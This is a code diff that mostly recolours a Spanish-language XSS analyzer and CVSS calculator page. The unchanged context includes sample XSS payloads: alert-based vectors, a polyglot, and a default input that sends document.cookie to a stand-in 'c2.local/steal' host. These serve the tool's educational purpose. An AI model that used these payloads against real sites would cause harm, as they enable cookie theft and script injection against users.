@@ -8,7 +8,7 @@ import Layout from '../../layouts/Layout.astro';
     <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-cyber-border/80 pb-5">
       <div>
         <h1 class="text-2xl sm:text-3xl font-bold font-mono text-white flex items-center gap-3">
-          <span class="p-2 rounded-lg bg-cyber-warning/10 border border-cyber-warning/30 text-cyber-warning">
+          <span class="p-2 rounded-lg bg-cyber-purple/20 border border-cyber-accent/40 text-cyber-pastelPink shadow-neon-purple/20">
             <svg class="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z" /></svg>
           </span>
           Analizador de Vectores & Calculadora CVSS v3.1
@@ -33,16 +33,16 @@ import Layout from '../../layouts/Layout.astro';
             <textarea
               id="analyzer-input"
               rows="5"
-              class="w-full p-3 rounded-lg bg-cyber-bg border border-cyber-border font-mono text-xs text-cyber-accent focus:border-cyber-accent focus:outline-none resize-none leading-relaxed"
+              class="w-full p-3 rounded-lg bg-cyber-bg border border-cyber-border font-mono text-xs text-cyber-pastelPink focus:border-cyber-pink focus:outline-none resize-none leading-relaxed"
               placeholder="Pega aquí el vector XSS..."
             >&lt;img src="x" onerror="fetch('http://c2.local/steal?c=' + document.cookie)"&gt;</textarea>
           </div>
 
           <div class="flex flex-wrap gap-1.5">
-            <button class="analyzer-preset px-2 py-1 rounded bg-cyber-panel text-slate-300 hover:text-white text-[11px] font-mono border border-cyber-border/60" data-code="<script>alert(1)</script>">Tag Script</button>
-            <button class="analyzer-preset px-2 py-1 rounded bg-cyber-panel text-slate-300 hover:text-white text-[11px] font-mono border border-cyber-border/60" data-code="<svg/onload=alert(1)>">SVG Tag</button>
-            <button class="analyzer-preset px-2 py-1 rounded bg-cyber-panel text-slate-300 hover:text-white text-[11px] font-mono border border-cyber-border/60" data-code="javascript:alert(document.cookie)">URI Scheme</button>
-            <button class="analyzer-preset px-2 py-1 rounded bg-cyber-panel text-slate-300 hover:text-white text-[11px] font-mono border border-cyber-border/60" data-code="jaVasCript:/*-/*`/*\`/*'/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/<titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e">Polyglot</button>
+            <button class="analyzer-preset px-2 py-1 rounded bg-cyber-panel text-slate-300 hover:text-cyber-pastelPink text-[11px] font-mono border border-cyber-border/60" data-code="<script>alert(1)</script>">Tag Script</button>
+            <button class="analyzer-preset px-2 py-1 rounded bg-cyber-panel text-slate-300 hover:text-cyber-pastelPink text-[11px] font-mono border border-cyber-border/60" data-code="<svg/onload=alert(1)>">SVG Tag</button>
+            <button class="analyzer-preset px-2 py-1 rounded bg-cyber-panel text-slate-300 hover:text-cyber-pastelPink text-[11px] font-mono border border-cyber-border/60" data-code="javascript:alert(document.cookie)">URI Scheme</button>
+            <button class="analyzer-preset px-2 py-1 rounded bg-cyber-panel text-slate-300 hover:text-cyber-pastelPink text-[11px] font-mono border border-cyber-border/60" data-code="jaVasCript:/*-/*`/*\`/*'/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/<titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e">Polyglot</button>
           </div>
         </div>
 
@@ -58,11 +58,11 @@ import Layout from '../../layouts/Layout.astro';
             </div>
             <div class="p-3 rounded bg-cyber-bg border border-cyber-border/60">
               <div class="text-[10px] text-slate-500 uppercase">OWASP Top 10 (2021):</div>
-              <div class="text-cyber-glow font-semibold mt-0.5">A03:2021 – Injection</div>
+              <div class="text-cyber-pink font-semibold mt-0.5">A03:2021 – Injection</div>
             </div>
             <div class="p-3 rounded bg-cyber-bg border border-cyber-border/60">
               <div class="text-[10px] text-slate-500 uppercase">MITRE ATT&CK Matrix:</div>
-              <div class="text-purple-400 font-semibold mt-0.5">T1059.007 – JavaScript Execution</div>
+              <div class="text-cyber-pastelPink font-semibold mt-0.5">T1059.007 – JavaScript Execution</div>
             </div>
           </div>
         </div>
@@ -79,7 +79,7 @@ import Layout from '../../layouts/Layout.astro';
 
           <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
             <div class="p-4 rounded-lg bg-cyber-bg border border-cyber-border/80 flex items-center gap-4">
-              <div class="text-4xl font-mono font-bold text-cyber-warning" id="analyzer-cvss-score">8.8</div>
+              <div class="text-4xl font-mono font-bold text-cyber-pink" id="analyzer-cvss-score">8.8</div>
               <div>
                 <div class="text-[11px] font-mono text-slate-400 uppercase">Puntuación Base</div>
                 <div class="text-xs font-mono text-slate-200 font-bold" id="analyzer-severity-text">ALTO (High)</div>
@@ -107,7 +107,7 @@ import Layout from '../../layouts/Layout.astro';
 
         <div class="rounded-xl bg-cyber-card border border-cyber-border p-5 space-y-3">
           <div class="flex items-center justify-between">
-            <h3 class="text-xs font-mono font-bold text-cyber-accent uppercase">Guía de Mitigación & Código Recomendado</h3>
+            <h3 class="text-xs font-mono font-bold text-cyber-pastelPink uppercase">Guía de Mitigación & Código Recomendado</h3>
             <span class="text-[10px] font-mono text-slate-400">Defensa en Profundidad</span>
           </div>
 
@@ -157,15 +157,15 @@ safe_output = escape(user_input)</pre>
     } else if (result.severity === 'Medium') {
       scoreElem.className = 'text-4xl font-mono font-bold text-cyber-warning';
     } else {
-      scoreElem.className = 'text-4xl font-mono font-bold text-cyber-glow';
+      scoreElem.className = 'text-4xl font-mono font-bold text-cyber-pastelPink';
     }
 
     if (badgeContainer) {
       badgeContainer.innerHTML = `
         <span class="px-2.5 py-0.5 rounded text-xs font-mono font-bold ${
-          result.severity === 'High' || result.severity === 'Critical' ? 'bg-red-950 text-red-400 border border-red-500' :
-          result.severity === 'Medium' ? 'bg-amber-950 text-amber-300 border border-amber-500' :
-          'bg-blue-950 text-blue-300 border border-blue-500'
+          result.severity === 'High' || result.severity === 'Critical' ? 'bg-red-950 text-red-300 border border-red-500' :
+          result.severity === 'Medium' ? 'bg-purple-950 text-purple-300 border border-purple-500' :
+          'bg-pink-950 text-pink-300 border border-pink-500'
         }">${result.severity}</span>
       `;
     }
@@ -179,7 +179,7 @@ safe_output = escape(user_input)</pre>
     if (detailsListElem) {
       detailsListElem.innerHTML = result.details.map(d => `
         <div class="flex items-start gap-2">
-          <span class="text-cyber-accent">•</span>
+          <span class="text-cyber-pink">•</span>
           <span>${d}</span>
         </div>
       `).join('');
